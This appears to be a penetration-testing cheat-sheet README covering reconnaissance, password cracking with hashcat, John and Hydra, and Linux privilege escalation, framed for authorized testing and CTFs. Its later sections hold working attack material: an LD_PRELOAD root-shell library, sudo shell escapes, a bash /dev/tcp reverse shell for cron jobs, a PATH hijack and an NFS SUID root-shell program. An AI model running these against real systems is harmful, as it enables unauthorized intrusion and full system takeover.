# Ethical Hacking Tool Repository

This repository provides a curated collection of tools used for various **Ethical Hacking** and **Penetration Testing** activities. Each major domain of ethical hacking is organized into a dedicated section, including a selection of commonly used tools and practical examples demonstrating their usage.

The repository is intended to serve as a concise and practical *reference guide* (cheat sheet) that can be readily consulted during penetration testing engagements, security assessments, Capture The Flag (CTF) competitions, and other authorized offensive security activities.

This repository covers the following areas:

- [Fingerprinting](#fingerpriting)
- [Exploitation](#exploitation)
- [Post-Exploitation](#post-exploitation)


## Fingerprinting

Fingerprinting is the process of gathering information about a target system during an ethical hacking or penetration testing engagement. It encompasses both **passive** and **active reconnaissance** techniques and aims to identify technical and contextual characteristics of the target, such as the operating system, network architecture, open ports, exposed services, software versions, and application behavior.

**Passive fingerprinting** involves collecting information without directly interacting with the target system. This may include analyzing publicly available data sources, metadata, DNS records, search engine results, or network traffic that is already being transmitted. Passive techniques are generally stealthy and do not generate detectable activity on the target.

**Active fingerprinting**, in contrast, requires direct interaction with the target through controlled probes and requests in order to elicit responses that reveal additional technical details. Although active techniques are more informative, they may generate logs or alerts and must therefore be performed only with explicit authorization.

In this section, the following categories of fingerprinting techniques are covered:

- [Web Browser Analysis](#web-browser-analysis)
- [Scanning](#scanning)
- [Vulnerability Assessment](#vulnerability-assessment)
- [Enumeration](#enumeration)


### Web Browser Analysis

Even though it may not be immediately apparent, modern web browsers provide a wide range of built-in tools that can be leveraged to analyze a website and, by extension, the service hosting it.

All major web browsers offer access to **Developer Tools** (commonly accessed via the *Inspect* option). These tools allow users to examine the website’s HTML, CSS, and JavaScript code, inspect network requests, analyze session cookies and local storage, and interact with a JavaScript console capable of executing arbitrary client-side code. In principle, these features are designed to expose only resources that the user is already authorized to access locally. For example, JavaScript executes on the client side, and cookies are limited to the user’s own session data. As such, these tools are not inherently intended to compromise application security.

However, the information exposed through Developer Tools can be highly valuable from an ethical hacking perspective. By analyzing client-side logic, cookie structures, request parameters, and input handling mechanisms, an attacker or penetration tester may gain insights into the internal workings of the application. This information can reveal weaknesses in session management, input validation, or access control, potentially enabling exploitation of functionality beyond the user’s intended privileges.

In addition to built-in Developer Tools, numerous browser extensions can further assist in web application fingerprinting by revealing underlying technologies or modifying how requests are handled. Commonly used extensions include:

- **FoxyProxy** – Allows rapid switching between proxy configurations, facilitating the interception and analysis of HTTP/HTTPS traffic through external tools.
- **User-Agent Switcher and Manager** – Enables the user to modify the User-Agent header in requests, simulating access from different devices, operating systems, or browsers.
- **Wappalyzer** – Identifies and reports the technologies used by a website, such as web frameworks, content management systems, server software, and analytics platforms.

### Scanning

Scanning is the process of systematically identifying active components within a target environment, such as live hosts, reachable network paths, open ports, and exposed services. This phase provides a clearer technical view of the target system and helps define the potential attack surface prior to exploitation.

Several common scanning techniques include:
- [Ping Sweep](#ping-sweep)
- [ARP Sweep](#arp-sweep)
- [Traceroute](#traceroute)
- [DNS Enumeration](#dns-enumeration)
- [War Driving](#war-driving)
- [Port Scanning](#port-scanning)

#### Ping Sweep

A ping sweep is a technique used to determine which hosts within a given IP address range are active. It works by sending ICMP Echo Request packets to multiple addresses and analyzing the responses. Hosts that reply are considered reachable, allowing the tester to identify live systems on a network. While simple and fast, ping sweeps may be unreliable in environments where ICMP traffic is filtered or blocked.

The following tools can be used to perform ping sweep operations:

- `ping` : The `ping` utility is a basic network diagnostic tool used to test the reachability of a single host by sending ICMP Echo Requests and measuring response times. While not designed for large-scale sweeps, it is useful for validating connectivity to individual systems.

```bash
# Ping a machine indefinitely until manually stopped
ping {MACHINE_IP | HOSTNAME}

# Send 10 ICMP Echo Requests (Linux / macOS)
ping -c 10 MACHINE_IP

# Send 10 ICMP Echo Requests (Windows)
ping -n 10 MACHINE_IP

# Send ICMP packets with a payload size of 32 bytes (40 bytes including header)
ping -s 32 MACHINE_IP
```

- `fping` : The `fping` tool is an enhanced version of `ping` optimized for scanning multiple hosts in parallel. It is particularly effective for performing fast ping sweeps across IP ranges or host lists.

```bash
# General command usage
fping <options> {MACHINE_IP | HOSTNAME}

# Commonly used attributes
-a              # Display only hosts that are alive
-u              # Display only unreachable hosts
-c <count>      # Number of echo requests to send per host
-t <timeout>    # Timeout in milliseconds to wait for a reply
-r <retries>    # Number of retries before marking a host unreachable
-s              # Display summary statistics
-e              # Show elapsed time for each response
-f <file>       # Read target hosts from a file
-g 192.168.1.0/24  # Generate and scan a target IP range
-I <interface>  # Specify the network interface to use
-S <src>        # Set a custom source IP address
-q              # Suppress per-host output (useful for scripting)
-N              # Disable DNS resolution
```

- `nmap` : Although primarily known for port scanning, `nmap` can also be used for host discovery by performing ping sweeps using its no port scan mode. This method leverages multiple discovery probes, making it more flexible than traditional ICMP-only approaches.

```bash
# Ping sweep against a single target
nmap -sn 192.168.1.134

# Ping sweep over an IP range
nmap -sn 192.168.1.10-50

# Ping sweep using CIDR notation
nmap -sn 192.168.1.0/24

# Ping sweep against a list of specific IP addresses
nmap -sn 192.168.1.1 192.168.1.3 192.168.1.4
```

#### ARP Sweep

An ARP sweep is a host discovery technique used primarily within local area networks (LANs). It involves sending Address Resolution Protocol (ARP) requests to identify active devices by mapping IP addresses to MAC addresses. Because ARP traffic is typically not filtered on local networks, ARP sweeps are often more reliable than ICMP-based methods for discovering live hosts in the same broadcast domain.

#### Traceroute

Traceroute is a network diagnostic technique used to identify the path that packets take from the source system to a target host. By analyzing the sequence of intermediate routers and their response times, traceroute helps map the network topology and identify potential choke points, firewalls, or routing anomalies. This information can be useful for understanding network structure and defensive boundaries.

#### DNS Enumeration

DNS enumeration involves collecting information from the Domain Name System to discover hostnames, subdomains, IP addresses, and other DNS records associated with a target domain. By querying DNS servers and analyzing their responses, a tester can uncover additional infrastructure that may not be immediately visible, such as development servers, mail servers, or internal naming conventions.

#### War Driving

War driving is a reconnaissance technique focused on discovering and analyzing wireless networks within a physical area. It typically involves scanning for Wi-Fi access points while moving through a location, collecting information such as network names (SSIDs), encryption methods, and signal strength. This technique is commonly used to assess the security posture of wireless environments.

#### Port Scanning

Port scanning is the process of probing a target host to identify open, closed, or filtered network ports. Each open port represents a potential entry point into the system and may correspond to a specific service or application. Port scanning helps determine which services are exposed and provides essential information for further enumeration and vulnerability analysis.


Explain ping

Windows Firewall blocks ping by default

```
# Ping a machine infinitely
ping {MACHINE_IP | HOSTNAME}

# Ping a machine 10 times in Linux / Mac
ping -c 10 MACHINE_IP

# Ping a machine 10 times in Windows
ping -n 10 MACHINE_IP

# Ping a machine with packets of 40 bytes in size (32 bytes + 8 bytes header)
ping -s 32 MACHINE_IP
```

Generally speaking, when we don’t get a ping reply back, there are a few explanations that would explain why we didn’t get a ping reply, for example:

- The destination computer is not responsive; possibly still booting up or turned off, or the OS has crashed.
- It is unplugged from the network, or there is a faulty network device across the path.
- A firewall is configured to block such packets. The firewall might be a piece of software running on the system itself or a separate network appliance. Note that MS Windows firewall blocks ping by default.
- Your system is unplugged from the network.

### Trace Route

3 packets with each TTL

```
# Find the path from our machine to targe
traceroute {MACHINE_IP | HOSTNAME}
tracert MACHINE_IP # MS Windows


```

### Telnet

Communications in clear text
Can communicate with whatever service uses TCP and no encryption
Could be used to prone an HTTP server for example with
`GET / HTTP/ 1.1` so we get information about it. (For example, server version)

```
# Connect to a service that doesn't use encryption
telnet MACHINE_IP PORT
```

### Netcat

Can act as a server or a client either in TCP or UDP

ports less than 1024 require root privilege

```
# Connect to a server that doesn't use encryption
nc MACHINE_IP PORT

# Act as a listening server on a specific port 1234
nc -l -p 1234

# Make the output verbose or very verbose
nc -v
nc -vv

# Act as a listening server on a specific port 1234 that keeps listening after client disconnects
nc -l -p 1234 -k

# Don't allow address resolution, only numerice IPs
nc -n
```

### Nmap

### Nessus

A tool with a GUI that allows to scan hosts and obtain several information about vulnerabilities in them.

https://www.tenable.com/products/nessus/nessus-essentials

```
https:\\localhost:8043
```

### OpenVAS

```
# Install the docker image to run OpenVAS
sudo apt install docker.io

# Run the docker image with OpenVAS
sudo docker run -d -p 443:443 --name openvas mikesplain/openvas
```

```
# Access to the OpenVAS GUI
https:\\127.0.0.1
username: admin
password: admin
```

Customized Wordlist
Cewl
```
# Get words from a website crawling
cewl -w {DESTINATION PATH} -d {DEPTH OF SEARCH} -m {MINIMUM WORD LENGTHS} {WEBSITE TO CRAWL}
```

Crunch
```
# Generate a wordlist based on all possible character combinations
crunch <min> <max> <char list> -o <destination>

# <char list> example
abdc232
214snfs
2rmfdsn

-t option

@ - all lowercase chars
, - all uppercase chars
% - all numeric
^ - special chars

examples: pass%%, name@,%...
```

Generate wordlist based on user information
```
git clone https://github.com/Mebus/cupp.git

# Run
python3 cupp.py -i

# Help
python3 cupp.py -h
```

Generate usernames based on user information
```
git clone https://github.com/therodri2/username_generator.git

# Get all the options for username_generator
python3 username_generator.py -h
```

Hashcat
```
# Default dictionary attack command
hashcat -a 0 -m {HASH MODE} {HASH} {WORDLIST IF APPLIABLE}

# Brute-force attack command
# List possibilities
hashcat -a 3 ?d?d?d?d --stdout

# Attack command
hashcat -a 3 -m {HASH MODE} {HASH} ?d?d?d?d
-a 7 -> wordlist + mask

# Show if positive result
hashcat -a {ATTACK MODE} -m {HASH MODE} {HASH} {WORDLIST IF APPLIABLE} --show

# Get information on hash types etc...
hashcat -h
```

John the Ripper
```
# Default command execution
john <options> {HASH FILE PATH}

# Specify wordlist
john --wordlist={PATH TO WORD LIST} {HASH}

# Specify format
john --format={HASH FORMAT} --wordlist={WORD} {HASH}

# List all available formats
john --list=formats

# Brute-force attack command
john --mask={THE MASK} --format={FORMAT} {HASH}

# Show (if) cracked password
john --format={FORMAT} --show {HASH}

# Single crack mode (base yourself on user information)
john --single --format={FORMAT} {HASH WITH USER INFO}

# Calling a custom rule in single crack mode
john --single --rule={RULE NAME} --format={FORMAT} {HASH WITH USER INFO}

# Calling a custom rule in normal mode (applies to the words in the list)
john --wordlist={WORDLIST} --rule={RULE NAME} --format={FORMAT} {HASH}

# Print all the brute force words
--stdout
```

```
# HASH WITH USER INFO (COULD BE THE UNSHADOW FILE)
{username}:{hash}
```

```
# Defining John Rules for password guessing
Az - a single word coming from wordlist, etc...
"..." - Add at the end of word
^... - Add at beggining

Use regex notation
```

```
# Unshadow suite
unshadow {PATH TO PASSWD} {PATH TO SHADOW} > {UNSHADOW PATH}

# Zip suite
zip2john {ZIP FILE} > {HASH DESTINATION FILE}

# Rar suite
rar2john {RAR FILE} > {HASH DESTINATION FILE}

# SSH suite
ssh2john {PRIVATE KEY FILE} > {HASH DESTINATION FILE}
```

```
# Get hash id
wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py

# Run hash id
python3 hash-id.py
```

Hydra for online attacks
```
# FTP Attack
hydra {HOST} -l <username> -P <wordlist>

# SMTP
hydra {HOST} -l <email address> -P <wordlist>

# SSH
hydra {HOST} -L <userlist> -P <wordlist>

# HTTP LOGIN
hydra {HOST} {REQUEST-TYPE} -l {USER} -P {WORDLIST} "{content}"

{REQUEST-TYPE} - http_get_form or http_post_form
{content} - path:parameters:condition

examples
path: /login-get/index.php
parameters: username=^USER^&password=^PASS^
condition: S:logout.php -> Success condition
           F: Invalid Login! -> Fail condition

-L -> several users
-l -> one user
-p -> one password
-P -> several passwords
-f -> stop bruteforce after finding correct
-v -> Verbose
```

Password spraying

Antivirus

ClamAV: https://www.clamav.net/
VirusTotal: https://www.virustotal.com/gui/home/upload
Jotti VirusScan: https://virusscan.jotti.org/ (Does not share with AV companies)

Signature based open source Antivirus

```
clamscan path/to/scan -> scan a folder
sigtool --{hash algorithm} path/to/file -> generate the hash signature of a file
clamscan -d path/to/custom/signaturedatabase path/to/scan

yara database -> a file with rules in yara formats, a file is considered malware if it matches the rules in the database
database -> a file with signatures separated by \n
--debug -> show more information
```

Fingerpriting Antivirus and other services

SharpEDRChecker: https://github.com/PwnDexter/SharpEDRChecker

Analyze the contents of a file

HxD application -> https://mh-nexus.de/en/hxd/

PE-Bear: (Analyze windows PE strucuture)
```
strings path/to/file -> outputs all human readable strings
```

Compile assembly code

```
write assembly code
nasm -f <system type (32 or 64)> path/to/code -> o
ld path/to/o -o future/exec -> exec
objdump -d file/to/dump -> shellcode (binary)
objcopy -j .text -O binary <exec> <exec>.text -> text file
xxd -i <exec>.txt -> binary in C code
xxd -i <bin>.bin -> binary in C code

in c:

(*(void(*)())message)();
```

Evasion of AV

Encoding & Decryption

Packers

ConfuserEx

Binders -> Merge two programs

### Privilege Escalation

Having access to a system doesn't always mean that we are able to do anything we want. Most of the times, when gaining access to a system we will probably be limited to a normal user with limited privileges, only allowing us to do little to no abuse.

Enters privilege escalation. The objective of this discipline is, once having access to a system, no matter what user we start in we exploit it to escalate our permissions to a more privileged user, or the admin itself if possible.

By exploiting and escalating our privileges, we will be able to abuse the system better and obtain explore it more.

The first step of this exploitation is exploring it's abuse vectors, covered by enumarition.

#### Enumeration

Consists of examaning the system with all available options we have as the user we currently have access to.

<ins>Linux</ins>

List of useful Linux commands:

```shell
# Get name of the machine
hostname

uname -a -> Information on the running system
/proc/version -> Kernel information
ps -> Process information
ps -A -> All processes
ps axjf -> Process tree
/etc/issue -> System information
env -> Enviromental variables
sudo -l -> List of commands current user can run as sudo
ls -la -> List all files even hidden
id <user> -> Information on users
/etc/passwd -> Information on users
history -> List of recent commands
ifconfig -> Network interface info
ip route -> Network routes
netstat -> Network communication info
netstat -a (open ports)
netstat -at (tcp) | -au (udp)
netstat -l (listening)
netstat -s (statistics)
netstat -tp (service info)
find -> filter directories and find depending on args
grep -> filter input

# Files with SUID or SGID set
find / -type f -perm -04000 -ls 2>/dev/null

# Files with capabilities
getcap -r / 2>/dev/null

# See cron jobs schedule
/etc/crontab

# See writable folders
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

# See NFS configuration
cat /etc/exports
showmount -e {VICTIM_ADDRESS}
```

List of useful third-party tools:

- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker

Enumeration once accessed

Tools

- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker

#### Kernel Exploits

One of the ways of escalating privileges is abusing the kernel version currently in use in the attack machine. This kernel version might have already written exploits that help us escalate privileges.

To looks for these exploits we can use:

- exploitDb
- searchsploit

#### Sudo Exploits

Even though using sudo is pretty limited, sometimes some low lever users have access to a set of restricted privileged commands using sudo.

Some of these applications might unwillingly allow us to do things we are not supposed to.

For example, Apache2:

```
apache2 -f /etc/shadow -> will show us the first line of etc/shadow after failing.
```

Patrical examples:

```
# Using find
sudo find \ -type f -name "sh" -exec {} \;

# Using nmap
sudo nmap --interactive
```

LD_PRELOAD

If a user has this permission `env_keep+=LD_PRELOAD`, this allows for custom libraries to be loaded before the sudo privileged program is executed using the LD_PRELOAD option.

Here is an exploit in c using this:

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```
# Compile as a library
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# Execute the exploit
sudo LD_PRELOAD=/home/user/ldpreload/shell.so <privilege cmd>
```

#### SUID Exploits

Sometimes in some systems, there are files with SUID owned by root. These files allow their execution with root privileges by any user. If a vulnerable file is SUID, it could be used to exploit an escalate our privileges allowing us to do whatever we want.

Examples are files that allow us to run arbitary code, or that allow us to manipulate restricted files.

Binaries known to be exploitable: https://gtfobins.github.io/

#### Capabilities Exploits

Just like SUID, capabilities allow users to get certain privileged permissions when executing commands. Unlike SUID, these permissions are more fine-grained and related to specific actions rather than the general executing a program as root.

If not properly set they could still be exploited to read unauthorized files or even gain root privileges.

Binaries known to be exploitable with capabilites also: https://gtfobins.github.io/

#### Cron Jobs Exploits

Cron jobs are scripts that are scheduled in a system to run from time to time. They normally run associated to the user who created them which means there will be scripts probably ran by root.

If the ran scripts are not properly permission protected or are not defined by a full path, they could be edited to run arbitary code, or the PATH variable could be changed to redirect the script to a PATH where the user has write permission. (MORE ON PATH IN THE NEXT SECTION).

Here is a reverse shell script that could be used for cron jobs:

```shell
#!/bin/bash

bash -i >& /dev/tcp/{attacker-address}/{port} 0>&1
```

```
# Attacker machine
nc -nlvp {port}
```

#### PATH Exploits

If a command is called without its full path specification, linux will look for it under the folders in the $PATH enviroment variable.

If a SUID program calls for a "test" program without specification of the full path, we could manipulate the $PATH variable to look first in a malicious directory for `test` cmd.

In this directory we would have a `test` script that would run a shell.

Here is how we would do:

```
# Add a directory to priority in PATH
export PATH=/tmp:$PATH

# Create malicious script
echo "/bin/bash" > test (in tmp directory)
```

### NFS Exploits

Sometimes gaining privilege escalation is not only about the local machine. We could for example find a SSH private key for root user and just SSH as the root user.

NFS (Network File Sharing) allows for files to be shared across devices. If the target is misconfigured (no_root_squash), which will make files be created by the owner of the directory (root if the case), NFS could allow for files to be written in this folders with root privileges and SUID, allowing for privilege escalation.

```
# Mount NFS on attacker
mount -o rw {address}:{path} {path/in/attacker}
```

Build privilege escalation exploit
```
int main() {
    setgid(0);
    setuid(0);
    system("/bin/sh");
    return 0;
}
```

Compile it and give it SUID
```
# In the mounted folder
gcc exploit.c -o exploit -w

chmod +s exploit
```
